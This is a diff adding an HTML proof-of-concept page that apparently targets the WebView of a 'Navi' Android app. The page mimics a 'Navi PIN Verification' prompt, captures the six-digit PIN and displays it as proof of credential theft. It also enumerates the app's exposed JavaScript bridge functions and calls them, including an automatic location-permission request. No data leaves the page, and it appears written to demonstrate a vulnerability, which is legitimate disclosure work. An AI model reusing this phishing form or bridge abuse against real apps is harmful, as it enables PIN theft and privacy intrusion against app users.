@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Navi Security</title>
+    <link rel="icon" href="data:,">
+    <style>
+        body { font-family: Arial; padding: 20px; max-width: 400px; margin: 0 auto; background: #f5f5f5; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .detection { background: #3366ff; color: white; padding: 15px; margin: 0 0 20px 0; border-radius: 8px; }
+        .proof { background: #ff4444; color: white; padding: 15px; margin: 15px 0; border-radius: 8px; border: 3px solid #ff0000; display: none; }
+        .log { background: black; color: #0f0; padding: 15px; margin-top: 20px; border-radius: 5px; font-family: monospace; font-size: 12px; }
+        input, button { padding: 12px; margin: 5px 0; width: 100%; box-sizing: border-box; font-size: 16px; }
+        button { background: #4a6ee0; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .bridge-btn { background: #ff6600; margin: 5px 2px; padding: 8px 12px; font-size: 14px; width: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="detection" id="detection">
+            <h3>🔍 WebView Detection</h3>
+            <div id="detectResult">Detecting...</div>
+        </div>
+        
+        <h2>🔐 Navi PIN Verification</h2>
+        <p>Enter 6-digit PIN sent to your phone:</p>
+        
+        <input type="password" id="pinInput" placeholder="000000" maxlength="6" autocomplete="off">
+        <button id="verifyBtn">Verify PIN</button>
+        
+        <div class="proof" id="proof">
+            <h3>🚨 VULNERABILITY EXPLOITED</h3>
+            <div id="proofContent"></div>
+        </div>
+        
+        <div style="margin: 15px 0; display: none;" id="bridgePanel">
+            <h4>JavaScript Bridge Test:</h4>
+            <button class="bridge-btn" id="openLinkBtn">Test: Open Google</button>
+            <button class="bridge-btn" id="locationBtn">Test: Request Location</button>
+            <button class="bridge-btn" id="closeBtn">Test: Close WebView</button>
+        </div>
+        
+        <div class="log" id="log"></div>
+    </div>
+
+    <script>
+        // ============================
+        // INITIAL DETECTION
+        // ============================
+        function detectEnvironment() {
+            const resultDiv = document.getElementById('detectResult');
+            let results = [];
+            
+            // Check 1: Android JS Bridge (WebView specific)
+            if (typeof Android !== 'undefined') {
+                const functions = [];
+                for (let key in Android) {
+                    if (typeof Android[key] === 'function') functions.push(key);
+                }
+                results.push('✅ <strong>Android JS Bridge DETECTED</strong>');
+                results.push(`   App: com.naviapp WebView`);
+                results.push(`   Functions: ${functions.join(', ')}`);
+            } else {
+                results.push('❌ Android JS Bridge not found');
+                results.push('   (Page not loaded in Navi WebView)');
+            }
+            
+            // Check 2: User Agent
+            const ua = navigator.userAgent.toLowerCase();
+            results.push(`📱 User Agent: ${navigator.userAgent.substring(0, 60)}...`);
+            
+            // Check 3: Current URL
+            results.push(`🌐 Loaded from: ${window.location.href}`);
+            
+            resultDiv.innerHTML = results.join('<br>');
+            
+            // If Android bridge exists, show bridge panel
+            if (typeof Android !== 'undefined') {
+                document.getElementById('bridgePanel').style.display = 'block';
+            }
+        }
+        
+        // ============================
+        // LOGGING FUNCTION
+        // ============================
+        function addLog(message) {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            logDiv.innerHTML += `[${time}] ${message}<br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+            console.log(message);
+        }
+        
+        // ============================
+        // MAIN ATTACK FUNCTION
+        // ============================
+        function startAttack() {
+            const pin = document.getElementById('pinInput').value.trim();
+            
+            if (pin.length !== 6) {
+                alert('Please enter 6-digit PIN');
+                return;
+            }
+            
+            addLog('═'.repeat(50));
+            addLog('🚨 ATTACK SEQUENCE STARTED');
+            addLog('═'.repeat(50));
+            
+            // 1. CAPTURE PIN
+            addLog(`STEP 1: PIN CAPTURED = ${pin}`);
+            
+            // Show proof
+            document.getElementById('proof').style.display = 'block';
+            document.getElementById('proofContent').innerHTML = `
+                <p><strong>PIN Captured:</strong> <span style="font-size:24px;background:black;padding:5px 15px;border-radius:5px;">${pin}</span></p>
+                <p><strong>Location:</strong> Navi App WebView</p>
+                <p><em>Proof of credential theft via WebView vulnerability</em></p>
+            `;
+            
+            // 2. DEMONSTRATE JS BRIDGE
+            setTimeout(() => {
+                if (typeof Android !== 'undefined') {
+                    addLog(`STEP 2: JS Bridge available (${Object.keys(Android).filter(k => typeof Android[k] === 'function').length} functions)`);
+                    
+                    // Auto-test after 2 seconds
+                    setTimeout(() => {
+                        if (Android.getLocationPermissions) {
+                            addLog('AUTO-TEST: Requesting location permissions');
+                            Android.getLocationPermissions();
+                        }
+                    }, 2000);
+                } else {
+                    addLog('STEP 2: JS Bridge not available');
+                }
+            }, 500);
+            
+            // Disable button
+            document.getElementById('verifyBtn').disabled = true;
+            document.getElementById('verifyBtn').textContent = '✓ PIN Captured';
+        }
+        
+        // ============================
+        // BRIDGE TEST FUNCTIONS
+        // ============================
+        function testOpenLink() {
+            if (typeof Android !== 'undefined' && Android.openLink) {
+                addLog('USER ACTION: Opening https://google.com via JS Bridge');
+                Android.openLink('https://google.com');
+            } else {
+                addLog('ERROR: Android.openLink not available');
+            }
+        }
+        
+        function testLocation() {
+            if (typeof Android !== 'undefined' && Android.getLocationPermissions) {
+                addLog('USER ACTION: Requesting location permissions');
+                Android.getLocationPermissions();
+            } else {
+                addLog('ERROR: Android.getLocationPermissions not available');
+            }
+        }
+        
+        function testClose() {
+            if (typeof Android !== 'undefined' && Android.closeView) {
+                addLog('USER ACTION: Closing WebView');
+                Android.closeView();
+            } else {
+                addLog('ERROR: Android.closeView not available');
+            }
+        }
+        
+        // ============================
+        // SETUP EVENT LISTENERS
+        // ============================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initial detection
+            detectEnvironment();
+            addLog('Page loaded in WebView');
+            addLog('Enter PIN to demonstrate exploit');
+            
+            // Setup button listeners
+            document.getElementById('verifyBtn').addEventListener('click', startAttack);
+            document.getElementById('openLinkBtn').addEventListener('click', testOpenLink);
+            document.getElementById('locationBtn').addEventListener('click', testLocation);
+            document.getElementById('closeBtn').addEventListener('click', testClose);
+        });
+    </script>
+</body>
+</html>
